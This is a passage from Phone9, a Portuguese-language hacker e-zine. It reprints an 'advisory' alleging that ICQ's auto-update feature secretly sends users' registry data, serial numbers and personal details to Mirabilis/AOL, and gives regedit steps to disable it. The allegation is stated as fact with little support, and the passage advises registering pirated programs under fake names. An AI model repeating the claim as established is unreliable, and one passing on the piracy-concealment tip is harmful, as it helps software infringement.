+by the bloodroot, blood@phone9.org
+"I'll kick the root down, uppon my rootdown..."
+r00t d0wn k0mmunications , Inc.
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³20 - Microsoftz advisory: ICQ, warez group??? 			       ³°°
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ by bloodroot ³°°
+	  	  						          ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ°°
+	Microsoftz Associates, Security Advisory.
+      by Phineas Phreak.
+
+     - microsoftz.cjb.net - microsoftz.cjb.net - microsoftz.cjb.net -
+
+ICQ procura por programas piratas!
+
+Recentemente isto tem chamado atenção dos usuários do ICQ de que a Mirabilis
+esta obtendo informacoes especificas do registro no sistema dos usuarios.
+
+O valor no registro:
+HKEY_CURRENT_USER\Software\Mirabilis\ICQ\DefaultPrefs\Auto Update
+foi colocado pelo cliente do ICQ desde a primeira versão.
+
+A intencao original deste valor nesta chave do registro era de permitir o 
+ICQ atualizar automaticamente o cliente sem que o usuario precisa-se baixar 
+a última versão.
+Mas, esta era a intencao original da Mirabilis, depois que foi comprada pela
+AOL este recurso esta sendo utilizado de ma fe.
+
+Ela permite que o servidor da mirabilis modifique o seu cliente do ICQ e en-
+vie comandos quando conectamos aos seus servidores. Esta instruindo maquinas
+para enviar varios componentes do registro do Windows para os servidores  de
+ICQ periodicamente.
+Isto permite a Mirabilis ver que programas voce tem instalado no seu compu-
+tador, numeros de serie que você usou, seu nome, sua compania e outras coi-
+sas relativas ao seu endereço residencial!
+
+Esta informacao esta sendo obtida poderia ser vendida aos grandes vendedores
+de software como por exemplo a Microsoft que esta tentando combater softwa-
+res globalmente.
+Se eles nao tem intencao de vender esta informaaoo pegas  do seu  computador
+sem o seu conhecimento, o que eles vao fazer com isso?
+
+Se voce tiver programas piratas em seu computador, voce nao precisa ficar 
+assustado.
+
+Se tem um  programa pirata instalado  no seu computador,  verifique se  esta
+registrado com um nome fantasma. Se nao for o caso, veja as instrucoes  para
+desabilitar este recurso de atualizacao automatica instalado pela Mirabilis.
+
+As instrucoes a seguir sao fornecidas apenas para protege-lo, modificando o
+registro do Windows usando o Editor de Registro (regedit.exe)
+
+
+Passo 1:
+
+No editor de registro procure a chave:
+
+HKEY_CURRENT_USER\Software\Mirabilis\ICQ\DefaultPrefs\
+
+Passo 2:
+
+Altere o valor do Auto Update para "No"
+
+Talvez a  Mirabilis tenha decidido colocar este recurso para usar para atua-
+lizar seu cliente automaticamente e nao ser necessario fazer o download  ma-
+nualmente.
+
+As versoes Java e Macintosh do cliente ICQ nao estao afetadas!!!
+
+Maiores informacoes a respeito desse problema pode ser encontrada na Wired!
+<http://www.wired.com/news/news/technology/story/4987ay.html>
+
+Phineas Phreak
+[ phineas@phone9.org | phineas@microsoftz.com ]
+
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³20 - selbstmordert, o fim esta proximo					       ³°°
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ by bloodroot ³°°
+	  	  						          ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ°°
+
+  Chegamos ao fim da nossa prodigia zine 31337, Phone9. Esperamos que vo-
+  ces tenham aprendido algo de util para a insiguinificante vida de voces
+  caso o contrario, telnet 127.0.0.1 19 =)
+
+  Sites de download da Phone9:
+  webcrunchers.com/phone9
+  deathknights.com/phone9
+  puruca.com.br/phone9
+  webelite.com.br/phone9
+  ereethackers.com/phone9
+
+  Solucoes para portas abertas indesejadas,
+  Backdoor Protection System:
+  
+  phone9.org/labs/tools/bps.zip
+ 
+  cya... 
+
+The Phone9 communications Systems, Inc.
+contact: [blood@phone9.org]|[klepto@ereethackers.com]
+
+                                        __     _____
+                  _____ _   _ _____  /\ \ \___/  _  \
+                 |  _  | |_| |     |/  \/ / __\__   /
+                 |   __|  _  | [ ] / /\  / __/  /  /
+                 |__|  |_| |_|_____\/  \/\____\/__/
+ 			    The Phone9 Communications.
+
+thanx to: Puruca, Cacaio, Cezinha, [_Hi-Fi_], MaNdRaCk, Psychodeath, 
+          paranoia, Phineas Phreak, k0rn, k2, kkkk, Dr.Sm0g. klopek.
+
+          
